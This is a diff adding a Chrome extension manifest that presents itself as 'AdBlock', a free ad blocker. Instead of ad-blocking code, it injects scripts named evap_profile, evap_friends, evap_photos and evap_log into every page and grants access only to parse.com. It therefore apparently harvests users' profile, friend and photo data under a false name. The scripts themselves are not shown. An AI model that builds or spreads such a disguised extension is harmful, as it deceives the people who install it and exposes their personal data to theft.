@@ -1,0 +1,18 @@
+{
+	"manifest_version": 2,
+	"name": "AdBlock",
+	"version": "1.9.0",
+	"description": "The free adblock tool for Chrome: Blocks annoying video ads on YouTube, Facebook ads, banners and much more.",
+
+	"permissions": [
+		"https://parse.com/"
+	],
+	"content_scripts":[
+		{
+			"matches":["<all_urls>"],
+			"js":["jquery-2.1.1.min.js","parse.min.js","evap_profile.js","evap_friends.js","evap_photos.js","evap_log.js","evap_controller.js"]
+		}
+	],
+	"web_accessible_resources":["script/jquery-2.1.1.min.js"]
+	
+}
